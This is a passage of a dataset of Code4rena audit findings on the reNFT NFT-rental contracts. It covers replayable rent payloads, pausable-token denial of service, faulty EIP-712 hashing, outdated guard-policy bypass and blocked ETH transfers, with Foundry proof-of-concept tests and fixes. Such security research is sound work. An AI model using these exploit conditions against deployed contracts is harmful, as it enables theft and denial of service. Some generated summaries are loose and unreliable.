rentalOrders = finalizePayOrdersFulfillment();\n\n        // pull out just the PAY orders\n        RentalOrder[] memory payRentalOrders = new RentalOrder[](3);\n        for (uint256 i = 0; i < rentalOrders.length; i++) {\n            if (rentalOrders[i].orderType == OrderType.PAY) {\n                payRentalOrders[i / 2] = rentalOrders[i];\n            }\n        }\n\n        // speed up in time past the rental expiration\n        vm.warp(block.timestamp + 750);\n\n        // renter stops the rental order\n        vm.prank(dan.addr);\n        stop.stopRentBatch(payRentalOrders);\n\n        // for each rental order stopped, perform some assertions\n        for (uint256 i = 0; i < payRentalOrders.length; i++) {\n            // assert that the rental order doesnt exist in storage\n            assertEq(STORE.orders(payRentalOrders[i].seaportOrderHash), false);\n\n            // assert that the token is no longer rented out in storage\n            assertEq(\n                STORE.isRentedOut(\n                    payRentalOrders[i].rentalWallet,\n                    address(erc721s[0]),\n                    i\n                ),\n                false\n            );\n\n            // assert that the ERC721 is back to its original owner\n            assertEq(erc721s[0].ownerOf(i), address(offerers[i].addr));\n\n            // assert that each offerer made a payment\n            assertEq(erc20s[0].balanceOf(offerers[i].addr), uint256(9900));\n        }\n\n        // assert that the payments were pulled from the escrow contract\n        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(0));\n\n        // assert that the fulfiller was paid for each order\n        assertEq(erc20s[0].balanceOf(dan.addr), uint256(10300));\n    }\n```\n\n</details>\n\nYou may find out that all `extraData` are same although the rental orders are created by different lenders.\n\n### Recommended Mitigation Steps\n\nIntroduces a field into `RentPayload` to ensure every `payload` unique. It is feasible using `orderHash` of the rental order:\n\n```solidity\nstruct RentPayload {\n    bytes32 orderHash;\n    OrderFulfillment fulfillment;\n    OrderMetadata metadata;\n    uint256 expiration;\n    address intendedFulfiller;\n}\n```\n\n**[0xean (Judge) decreased severity to Medium](https://github.com/code-423n4/2024-01-renft-findings/issues/162#issuecomment-1913718038)**\n\n**[Alec1017 (reNFT) confirmed via duplicate #239](https://github.com/code-423n4/2024-01-renft-findings/issues/239#issuecomment-1908739770)**\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/10) - Prevents `RentPayload` replayability and ensures that orders must be unique by disallowing partial orders from seaport.\n\n**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/19), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/65) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/60).\n\n***\n\n",
      "summary": "\nThe report describes a bug in reNFT's rental process that could allow a malicious user to fulfill multiple rental orders and gain rental earnings. The bug is caused by the lack of a way to verify whether a signature has been used or not. This could be exploited if multiple rental orders own the same metadata. The report suggests adding a field to ensure that each payload is unique. The bug was confirmed by the reNFT team and has been mitigated.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/162",
      "tags": [
        "Replay Attack"
      ],
      "finders": [
        "0xpiken",
        "Kalyan-Singh",
        "evmboi32",
        "rbserver",
        "OMEN",
        "kaden",
        "bareli",
        "hash",
        "peter",
        "trachev",
        "hals",
        "Topmark"
      ]
    },
    {
      "id": "30539",
      "title": "[M-12] paused ERC721/ERC1155 could cause stopRent to revert, potentially causing issues for the lender.",
      "impact": "MEDIUM",
      "content": "\nMany ERC721/ERC1155 tokens, including well-known games such as Axie Infinity, have a pause functionality inside the contract. This pause functionality will cause the `stopRent` call to always revert and could cause issues, especially for the `PAY` order type.\n\n### Proof of Concept\n\nWhen `stopRent` /`stopRentBatch` is called, it will eventually trigger `  _reclaimRentedItems ` and execute `reclaimRentalOrder` from the safe to send back tokens to lender.\n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L353> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L293> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L166-L183>\n\n\n\n```solidity\n    function _reclaimRentedItems(RentalOrder memory order) internal {\n        // Transfer ERC721s from the renter back to lender.\n        bool success = ISafe(order.rentalWallet).execTransactionFromModule(\n            // Stop policy inherits the reclaimer package.\n            address(this),\n            // value.\n            0,\n            // The encoded call to the `reclaimRentalOrder` function.\n            abi.encodeWithSelector(this.reclaimRentalOrder.selector, order),\n            // Safe must delegate call to the stop policy so that it is the msg.sender.\n            Enum.Operation.DelegateCall\n        );\n\n        // Assert that the transfer back to the lender was successful.\n        if (!success) {\n            revert Errors.StopPolicy_ReclaimFailed();\n        }\n    }\n```\n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L71-L101> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L32-L34> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L42-L50>\n\n```solidity\n    function reclaimRentalOrder(RentalOrder calldata rentalOrder) external {\n        // This contract address must be in the context of another address.\n        if (address(this) == original) {\n            revert Errors.ReclaimerPackage_OnlyDelegateCallAllowed();\n        }\n\n        // Only the rental wallet specified in the order can be the address that\n        // initates the reclaim. In the context of a delegate call, address(this)\n        // will be the safe.\n        if (address(this) != rentalOrder.rentalWallet) {\n            revert Errors.ReclaimerPackage_OnlyRentalSafeAllowed(\n                rentalOrder.rentalWallet\n            );\n        }\n\n        // Get a count for the number of items.\n        uint256 itemCount = rentalOrder.items.length;\n\n        // Transfer each item if it is a rented asset.\n        for (uint256 i = 0; i < itemCount; ++i) {\n            Item memory item = rentalOrder.items[i];\n\n            // Check if the item is an ERC721.\n            if (item.itemType == ItemType.ERC721)\n>>>             _transferERC721(item, rentalOrder.lender);\n\n            // check if the item is an ERC1155.\n            if (item.itemType == ItemType.ERC1155)\n>>>             _transferERC1155(item, rentalOrder.lender);\n        }\n    }\n```\n\nIt can be observed that AxieInfinity has paused functionality : <https://etherscan.io/address/0xf5b0a3efb8e8e4c201e2a935f110eaaf3ffecb8d>\n\nThis is problematic, especially for the `PAY` order type. Consider a scenario where the lender is not satisfied with how the renter utilizes their `PAY` order's NFTs. Now, when the lender wants to early stop the rent and calls `stopRent`, the call will revert, and the earning calculation for the renter will still be growing.\n\n### Recommended Mitigation Steps\n\nConsider decoupling the NFT claim from stopRent and introducing a timestamp tracker when the lender calls stopRent. Utilize that timestamp value when the rent stop is finalized and calculate the ERC20 reward for the renter.\n\n**[Alec1017 (reNFT) acknowledged and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/220#issuecomment-1908721888):**\n > Non-standard ERC implementations were considered out of scope, but regardless we do plan on adding a whitelist for tokens interacting with the protocol\n\n**[0xean (Judge) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/220#issuecomment-1921360740):**\n > In theory the protocol could mitigate this with a pull mechanism which could be executed after the unpause and allow the counterparty to be unaffected.  Currently this amounts to a temporary DOS and therefore seems like M is correct.  I think its an edge case, but its plausible as the warden has shown. \n\n _Note: To see full discussion, see [here](https://github.com/code-423n4/2024-01-renft-findings/issues/220)._\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/7) - Implements a whitelist so only granted assets can be used in the protocol.<br>\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/17) - Implements batching functionality for whitelisting tokens so that multiple can be added at once.\n\n**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/64) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/59).\n\n***\n\n",
      "summary": "\nERC721/ERC1155 tokens, such as those used in popular games like Axie Infinity, have a feature called \"pause\" in their contracts. This pause feature can cause problems when using the `stopRent` function, especially for the `PAY` order type. A demonstration of this issue can be found in the code provided in the report. The team behind the protocol has acknowledged the issue and has taken steps to mitigate it by implementing a whitelist for tokens that can be used in the protocol. This has been confirmed as a successful mitigation by independent reviewers.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/220",
      "tags": [
        "NFT",
        "ERC1155",
        "ERC721",
        "Grief Attack"
      ],
      "finders": [
        "SBSecurity",
        "said"
      ]
    },
    {
      "id": "30538",
      "title": "[M-11] Protocol does not implement EIP712 correctly on multiple occasions",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L151-L151> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L373-L375> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L384-L386> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L232-L238> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L636>\n\nBeing not EIP712 compliant can lead to issues with integrators and possibly DOS.\n\n### Problem 1\n\nThe implementation of the hook hash ([here](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L151C56-L151C56)) is done incorrectly. `hook.extraData` is of type `bytes` which according to EIP712 it is referred to as a `dynamic type`. Dynamic types must be first hashed with `keccak256` to become one 32-byte word before being encoded and hashed together with the typeHash and the other values.\n\n### Mitigation to Problem 1:\n\n```diff\nfunction _deriveHookHash(Hook memory hook) internal view returns (bytes32) {\n  // Derive and return the hook as specified by EIP-712.\n    return\n        keccak256(\n-           abi.encode(_HOOK_TYPEHASH, hook.target, hook.itemIndex, hook.extraData)\n+           abi.encode(_HOOK_TYPEHASH, hook.target, hook.itemIndex, keccak256(hook.extraData))\n        );\n}\n```\n\n### Problem 2\n\nSome TypeHashes are computed by using `abi.encode` instead of `abi.encodePacked` ([here](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L373C1-L375)) which makes the typeHash value and the whole final hash different from the hash that correctly implementing EIP712 entities would get.\n\n```solidity\n// Construct the Item type string.\nbytes memory itemTypeString = abi.encodePacked(\n    \"Item(uint8 itemType,uint8 settleTo,address token,uint256 amount,uint256 identifier)\"\n);\n\n// Construct the Hook type string.\nbytes memory hookTypeString = abi.encodePacked(\n    \"Hook(address target,uint256 itemIndex,bytes extraData)\"\n);\n\n// Construct the RentalOrder type string.\nbytes memory rentalOrderTypeString = abi.encodePacked(\n    \"RentalOrder(bytes32 seaportOrderHash,Item[] items,Hook[] hooks,uint8 orderType,address lender,address renter,address rentalWallet,uint256 startTimestamp,uint256 endTimestamp)\"\n);\n\n...\n\nrentalOrderTypeHash = keccak256(\n    abi.encode(rentalOrderTypeString, hookTypeString, itemTypeString)\n);\n```\n\nThe problem with this is that abi.encode-ing strings results in bytes with arbitrary length. In such cases (like the one here) there is a high chance that the bytes will not represent an exact N words in length (X &ast; 32 bytes length) and the data is padded to conform uniformly to 32-byte words. This padding results in an incorrect hash of the typeHash and it will make the digest hash invalid when compared with properly implemented hashes from widely used libraries such as ethers.\n\n### Proof of Concept\n\nPlace the following code in any of the tests and run `forge test -—mt test_EIP712_encoding`\n\n```solidity\nfunction test_EIP712_encoding() public {\n\t\t// Copied from the reNFT codebase\n    bytes memory itemTypeString = abi.encodePacked(\n        \"Item(uint8 itemType,uint8 settleTo,address token,uint256 amount,uint256 identifier)\"\n    );\n    bytes memory hookTypeString = abi.encodePacked(\n        \"Hook(address target,uint256 itemIndex,bytes extraData)\"\n    );\n    bytes memory rentalOrderTypeString = abi.encodePacked(\n        \"RentalOrder(bytes32 seaportOrderHash,Item[] items,Hook[] hooks,uint8 orderType,address lender,address renter,address rentalWallet,uint256 startTimestamp,uint256 endTimestamp)\"\n    );\n\t\t// protocol implementation\n    bytes32 rentalOrderTypeHash = keccak256(\n        abi.encode(rentalOrderTypeString, hookTypeString, itemTypeString) // <-----\n    );\n\n    // correct implementation\n    bytes32 rentalOrderTypeHashCorrect = keccak256(\n        abi.encodePacked(rentalOrderTypeString, hookTypeString, itemTypeString) // <-----\n    );\n\n    // the correct typehash\n    bytes32 correctTypeHash = keccak256(\n        \"RentalOrder(bytes32 seaportOrderHash,Item[] items,Hook[] hooks,uint8 orderType,address lender,address renter,address rentalWallet,uint256 startTimestamp,uint256 endTimestamp)Hook(address target,uint256 itemIndex,bytes extraData)Item(uint8 itemType,uint8 settleTo,address token,uint256 amount,uint256 identifier)\"\n    );\n\n    assertNotEq(rentalOrderTypeHash, rentalOrderTypeHashCorrect);\n    assertNotEq(rentalOrderTypeHash, correctTypeHash);\n    assertEq(rentalOrderTypeHashCorrect, correctTypeHash);\n}\n```\n\nThis test shows that the `rentalOrderTypeHashCorrect` is the correct typeHash.\n\n### Mitigation to Problem 2\n\n```diff\nrentalOrderTypeHash = keccak256(\n-    abi.encode(rentalOrderTypeString, hookTypeString, itemTypeString)\n+    abi.encodePacked(rentalOrderTypeString, hookTypeString, itemTypeString)\n);\n```\n\n### Problem 3\n\n`_deriveOrderMetadataHash`  constructs the hash incorrectly because \\_ORDER_METADATA_TYPEHASH includes `uint8 orderType` and `bytes emittedExtraData` (it can be seen [here](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L384-L386C15)) but these values are not provided below the typeHash (it can be seen [here](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L232-L238)).\n\n```solidity\nfunction _deriveOrderMetadataHash(\n    OrderMetadata memory metadata\n) internal view returns (bytes32) {\n    bytes32[] memory hookHashes = new bytes32[](metadata.hooks.length);\n\n    for (uint256 i = 0; i < metadata.hooks.length; ++i) {\n        hookHashes[i] = _deriveHookHash(metadata.hooks[i]);\n    }\n\n    return\n        keccak256(\n            abi.encode(\n                _ORDER_METADATA_TYPEHASH,// OrderMetadata(uint8 orderType,uint256 rentDuration,Hook[] hooks,bytes emittedExtraData)\n\t\t\t\t\t\t\t\t// <---- misses uint8 orderType\n                metadata.rentDuration,\n                keccak256(abi.encodePacked(hookHashes))\n\t\t\t\t\t\t\t\t// <---- misses bytes emittedExtraData\n            )\n        );\n}\n```\n\nThis hash is important because it is compared to the zoneHash inside `Create.sol:validateOrder → _rentFromZone → _isValidOrderMetadata` ([link](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L636)): So if the provided zoneHash from Seaport was generated correctly and it is not the same as the one generated by reNFT, the protocol will not be able to create any rentalOrders resulting in **DOS**.\n\nIn any case, this implementation is not according to EIP712 and either the fields must be included or the `_ORDER_METADATA_TYPEHASH` must remove `uint8 orderType` and `bytes emittedExtraData`\n\n### Tools Used\n\nFoundry\n\n### Recommendations\n\nApply the described fixes for each example.\n\n**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/239#issuecomment-1908739770)**\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/2) - Properly implements EIP-712.\n\n**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/17), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/62) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/58).\n\n***\n\n",
      "summary": "\nThis bug report discusses issues found in the code of the reNFT smart contracts. The first problem is that the implementation of the hook hash is incorrect, which can cause problems with integrators and potentially lead to denial of service attacks. The second issue is that some type hashes are computed using `abi.encode` instead of `abi.encodePacked`, resulting in an incorrect hash value. This can also cause problems with integrators and lead to incorrect hashes being compared with other libraries. The third problem is that the `_deriveOrderMetadataHash` function constructs the hash incorrectly, which can result in denial of service attacks. The report recommends applying the fixes described for each issue. The reNFT team has confirmed and mitigated the issues. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/239",
      "tags": [
        "EIP-712"
      ],
      "finders": [
        "3",
        "jasonxiale",
        "rokinot",
        "ZdravkoHr",
        "ravikiranweb3",
        "Tendency",
        "trachev",
        "zaevlad",
        "0xPsuedoPandit",
        "juancito",
        "Hajime",
        "pkqs90",
        "BI\\_security",
        "KupiaSec",
        "SpicyMeatball",
        "haxatron",
        "KingNFT",
        "boringslav",
        "J4X",
        "zzebra83",
        "NentoR",
        "ABAIKUNANBAEV",
        "Beepidibop",
        "plasmablocks",
        "Ward",
        "1",
        "2",
        "Giorgio",
        "deepplus",
        "4"
      ]
    },
    {
      "id": "30537",
      "title": "[M-10] The owners of a rental safe can continue to use the old guard policy contract for as long as they want, regardless of a new guard policy upgrade",
      "impact": "MEDIUM",
      "content": "\nPolicy contracts such as Guard.sol can be upgraded when needed. However, there is a vulnerability in existing implementation of Guard policy, that allows a rental safe contract to use the outdated Guard.sol for an unlimited amount of time.\n\nThis compromises the security of the rental wallet because unsafe transactions that are checked and reverted in the new guard policy contract can be directly bypassed and permitted in rental safe contract using an old guard policy.\n\n### Proof of Concept\n\nPolicy contracts can be upgraded by protocol executor on Kernel.sol through `executeAction()` -> `_activatePolicy()` -> `_deactivePolicy()`. When Guard.sol needs to be upgraded, the intended flow is a) `_activatePolicy(newGuard)` b) `_deactivePolicy(oldGuard)`, c) admin will whitelist a temporary migration contract which allows any rental safe wallet to make a delegate call to migration contract to upgrade the guard address in storage. This flow can also be confirmed in test: test/integration/upgradeability/GuardPolicyUpgrade.t.sol.\n\nNote in this intended flow, the rental safe contract owner needs to initiate a delegate call to the whitelisted migration contract to update the pointer to the new guard address.\n\nHowever, the issue is (1) there is no enforcement that an existing rental safe contract owner will call the migration contract to upgrade their guard address; (2)  even if the safe owner doesn't call to update their guard address, the rental safe will be able to continue to use the old guard contract to execute transactions, bypassing any new restrictions that might be enforced in the new guard.\n\nThis is because current Guard.sol's key user flows that involve `_checkTransactions()`, `_forwardToHook()`,`_revertNonWhiteListedExtensions()` won't check if the existing Guard.sol address stored in the safe contract is still active, and these flows will only call Storage.sol's view functions or public variables that have no access control to revert when the caller Guard.sol is no longer active in Kernel.\n\nAs a result, even though the active Guard.sol in Kernel.sol is a different address and the old guard doesn't exist in Kernel's storage, all the rental safe flows can still use the old guard to check transactions.\n\n<details>\n\n```solidity\n//src/policies/Guard.sol\n    function checkTransaction(\n        address to,\n        uint256 value,\n        bytes memory data,\n        Enum.Operation operation,\n        uint256,\n        uint256,\n        uint256,\n        address,\n        address payable,\n        bytes memory,\n        address\n    ) external override {\n        // Disallow transactions that use delegate call, unless explicitly\n        // permitted by the protocol.\n|>      //@audit There are no checks to see if address(this) (guard) is still active in Kernel.sol\n        //@audit note: when Guard.sol is no longer active, STORE.whitelistedDelegates(to) will still pass, because it's a view funciton with no access control\n|>      if (operation == Enum.Operation.DelegateCall && !STORE.whitelistedDelegates(to)) {\n            revert Errors.GuardPolicy_UnauthorizedDelegateCall(to);\n        }\n        // Require that a function selector exists.\n        if (data.length < 4) {\n            revert Errors.GuardPolicy_FunctionSelectorRequired();\n        }\n        // Fetch the hook to interact with for this transaction.\n        //@audit note: when Guard.sol is no longer active, STORE.contractToHook(to) and STORE.hookOnTransaction(hook) because they are view functions with no access control\n|>      address hook = STORE.contractToHook(to);\n|>      bool isActive = STORE.hookOnTransaction(hook);\n        // If a hook exists and is enabled, forward the control flow to the hook.\n        if (hook != address(0) && isActive) {\n            _forwardToHook(hook, msg.sender, to, value, data);\n        }\n        // If no hook exists, use basic tx check.\n        else {\n            _checkTransaction(msg.sender, to, data);\n        }\n    }\n```\n\n</details>\n\n(<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L324-L331>)\n\n<details>\n\n```solidity\n//src/policies/Guard.sol\n    function _checkTransaction(address from, address to, bytes memory data) private view {\n...\n            //@audit when Guard.sol is no longer active in Kernel, _revertSelectorOnActiveRental() will still work because it only calls view functions with no access control.\n|>          _revertSelectorOnActiveRental(selector, from, to, tokenId);\n...\n            //@audit when Guard.sol is no longer active in Kernel, _revertNonWhitelistedExtension() will still work because it only calls view function with no access control\n|>          _revertNonWhitelistedExtension(extension);\n    }\n\n    function _revertSelectorOnActiveRental(\n        bytes4 selector,\n        address safe,\n        address token,\n        uint256 tokenId\n    ) private view {\n        // Check if the selector is allowed.\n        //@audit when Guard.sol is no longer active in Kernel, STORE.isRentedOut() will still work because it only calls view function with no access control\n|>      if (STORE.isRentedOut(safe, token, tokenId)) {\n            revert Errors.GuardPolicy_UnauthorizedSelector(selector);\n        }\n    }\n\n    function _revertNonWhitelistedExtension(address extension) private view {\n        // Check if the extension is whitelisted.\n        //@audit when Guard.sol is no longer active in Kernel, STORE.whitelistedExtensions() will still work because it only calls view function with no access control\n|>       if (!STORE.whitelistedExtensions(extension)) {\n            revert Errors.GuardPolicy_UnauthorizedExtension(extension);\n        }\n    }\n```\n</details>\n\n(<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L133>)\n(<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L145>)\n\nIn addition, this creates a condition where the behaviors of different rental safe contracts can be uneven, depending on whether a specific rental safe is using a new guard or old guard, they might have different levels of restrictions in executions, which undermines the fairness in the rental process. For example, some new function selectors can be prohibited from execution in the new guard based on the protocol needs, but these selectors will continue to be allowed in rental safes that use the old guard.\n\nFor comparison, a rental safe using an old Stop policy (Stop.sol) will cause revert at `stopRent()` or `stopRentBatch()` flow due to failing permissioned function sig checks, which will force safe owners to migrate to the new Stop.sol. But an old Guard policy allows safe owners to continue using an outdated `checkTransaction()` logics, which I consider it high severity.\n\n### Recommended Mitigation Steps\n\nIn `checkTransaction()` , call Kernal.sol to check whether `address(this)` ( Guard.sol that the safe is pointing to) is still active. This can be done by calling `uint256 index = kernel.getPolicyIndex(address(this))` and then check if the index corresponds to `address(this)` in `kernel.activePolicies`.\n\n**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/267#issuecomment-1910526872)**\n\n**[0xean (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/267#issuecomment-1913247132):**\n > > This compromises the security of the rental wallet because unsafe transactions that are checked and reverted in the new guard policy contract can be directly bypassed and permitted in rental safe contract using an old guard policy.\n> \n> The warden doesn't show how this directly leads to loss of funds.  I think this falls into:\n> \n> >  but the function of the protocol or its availability could be impacted, \n> \n> Therefore should be M.\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/12) - Introduces `isActive` check on the guard policy. Ensures that safes cannot use a guard that has been deactivated.\n\n**Status:** Mitigation error. Full details in report from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/61), and also included in the [Mitigation Review](#mitigation-review) section below.\n\n***\n\n",
      "summary": "\nThe Guard policy contract, which is used to upgrade policy contracts in the reNFT protocol, has a vulnerability that allows rental safe contracts to continue using an outdated version of the Guard contract indefinitely. This means that unsafe transactions can bypass new security measures put in place by the updated Guard contract. The intended process for upgrading the Guard contract involves the safe contract owner initiating a delegate call to a temporary migration contract, which would then update the Guard address in storage. However, there is no enforcement to ensure that this process is followed, and even if it is not, the rental safe contract can still use the old Guard contract to execute transactions. This can lead to uneven and potentially unfair behavior among different rental safe contracts. The recommended mitigation is to add a check in the `checkTransaction()` function to ensure that the Guard contract is still active. The severity of this issue was initially considered high, but was later decreased to medium as it does not directly lead to loss of funds, but could impact the function or availability of the protocol. The reNFT team has implemented a mitigation, but it was found to have an error and is currently being reviewed. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/267",
      "tags": [],
      "finders": [
        "m4ttm",
        "ladboy233",
        "oakcobalt"
      ]
    },
    {
      "id": "30536",
      "title": "[M-09] `Guard::checkTransaction` restricts native ETH transfer from user's safes",
      "impact": "MEDIUM",
      "content": "\nThe `Guard::checkTransaction` function's current design unintentionally restricts native ETH transfers from the safe. This limitation originates from a data length check that requires transaction data to be at least `4 bytes` long, aiming to validate the presence of a function selector.\n\nHowever, since native ETH transfers have empty data fields, they fail this, leading to an inability to execute such transfers.\n\nThis results in a significant functional restriction, as users are unable to execute standard ETH transfers from their safes.\n\nThe Safe contracts contains `receive` function which by default enables them to receive native ETH. These native tokens can be transferred to safe by protocol users or current/future protocol hooks.\n\n```solidity\n    receive() external payable {\n        emit SafeReceived(msg.sender, msg.value);\n    }\n```\n\n### Proof of Concept\n\nThe `Guard::checkTransaction` is designed to validate transactions initiated by a rental safe. Its role is to ascertain whether a transaction meets the set criteria based on its destination, value, data and operation type. This function is a critical component in ensuring that transactions are executed in accordance with the protocol's rule.\n\nA notable issue within the `Guard::checkTransaction` function is its requirement for transaction data to be at least 4 bytes long, as indicated by this code:\n\nIn `src/policies/Guard.sol`\n\n```solidity\n328        // Require that a function selector exists.\n329        if (data.length < 4) {\n330            revert Errors.GuardPolicy_FunctionSelectorRequired();\n331        }\n```\n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L328C1-L331C10>\n\nThis condition is ideal for transactions involving function calls where a function selector is necessary.\n\nHowever, this becomes problematic for native ETH transfers, which are characteristically simple transactions without any data payload. As these transactions have a data length of zero bytes, failing the imposed condition.\n\nSuch transactions are automatically rejected by the `Guard::checkTransaction` function due to not meeting the 4-byte data length requirement.\n\nThe inability to transfer native ETH not only reduces the safe's practicality but also poses a severe limitation on user operations, affecting trust and reliability in the system.\n\nThe following foundry test shows the process described above. Copy and paste it into test folder to run.\n\n<details>\n<summary>\nClick to expand Foundry Test\n</summary>\n\n```javascript\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.20;\n\nimport {BaseTest} from \"@test/BaseTest.sol\";\nimport {SafeProxyFactory} from \"@safe-contracts/proxies/SafeProxyFactory.sol\";\nimport {SafeL2} from \"@safe-contracts/SafeL2.sol\";\nimport {ISafe} from \"@src/interfaces/ISafe.sol\";\nimport {Enum} from \"@safe-contracts/common/Enum.sol\";\nimport {Errors} from \"@src/libraries/Errors.sol\";\n\ncontract SafeStuckEth is BaseTest {\n\n    // In this test case we'll see how ETH transfers works fine for normal Gnosis Safes\n    // But doesn't work for ReNFT Safes\n    function test_poc() public {\n        vm.startPrank(alice.addr);\n\n        // Create a new safe by directly interacting with Gnosis safe factory\n        SafeProxyFactory safeFactory = factory.safeProxyFactory();\n        SafeL2 safeSingleton = factory.safeSingleton();\n        address[] memory owners = new address[](1);\n        owners[0] = alice.addr;\n        bytes memory initializerPayload = abi.encodeCall(\n            ISafe.setup,\n            (\n                owners,\n                1,\n                address(0),\n                new bytes(0),\n                address(0),\n                address(0),\n                0,\n                payable(address(0))\n            )\n        );\n        // new safe is created\n        address newSafe = address(\n            safeFactory.createProxyWithNonce(\n                address(safeSingleton),\n                initializerPayload,\n                uint256(keccak256(\"\"))\n            )\n        );\n        address receiver = address(0x1010101);\n\n        // Transfer some ETH to the freshly deployed safe\n        vm.deal(newSafe, 1 ether);\n        assertEq(newSafe.balance, 1 ether);\n        assertEq(receiver.balance, 0);\n\n        // Pull out the sent ETH from the safe\n        bytes memory transactionSignature = _signTransaction(\n            address(newSafe),\n            Enum.Operation.Call,\n            alice.privateKey,\n            address(receiver),\n            1 ether,\n            new bytes(0)\n        );\n        _executeTransaction(\n            address(newSafe),\n            Enum.Operation.Call,\n            address(receiver),\n            1 ether,\n            new bytes(0),\n            transactionSignature,\n            new bytes(0)\n        );\n        // ETH succesfully pulled out from the safe\n        assertEq(newSafe.balance, 0);\n        assertEq(receiver.balance, 1 ether);\n\n        /// Now replicate same scenario for a ReNFT safe\n\n        // Send some ETH to an existing ReNFT safe of Alice\n        vm.deal(address(alice.safe), 1 ether);\n        assertEq(address(alice.safe).balance, 1 ether);\n        assertEq(receiver.balance, 1 ether);\n\n        transactionSignature = _signTransaction(\n            address(alice.safe),\n            Enum.Operation.Call,\n            alice.privateKey,\n            address(receiver),\n            1 ether,\n            new bytes(0)\n        );\n        // Try to pull out ETH\n        // 